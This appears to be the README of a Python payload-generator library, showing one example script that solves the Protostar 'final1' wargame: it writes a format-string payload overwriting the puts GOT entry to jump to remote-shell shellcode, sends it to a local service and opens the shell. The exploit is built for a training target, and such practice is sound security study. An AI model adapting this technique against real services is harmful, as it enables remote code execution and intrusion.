Payload Generator
================

## Example

This script resolves the challenge : https://exploit-exercises.com/protostar/final1/

    import time
    import sys

    from payload import *
    import shellcode
    import formatstr
    import heap
    import polymorphic

    puts_got = 0x804a194
    data_username = 0x804a220
    port = 11111

    sc = shellcode.remote_shell(port)
    payload1 = b"username " + sc + b"\n"

    # assume that we are connected with a port with 5 numbers and in localhost
    before = len("Login from 127.0.0.1:00000 as [] with password [AAA") + len(sc)

    # payload2 = b"login AAACCCC" + formatstr.hexdump(12, 38, sep="-") + b"\n"
    payload2 = b"login AAA"
    payload2 += formatstr.write(puts_got, data_username, before, 38)
    payload2 += b"\n"

    send("127.0.0.1", 2994, payload1 + payload2)

    time.sleep(1)
    interact("127.0.0.1", port)

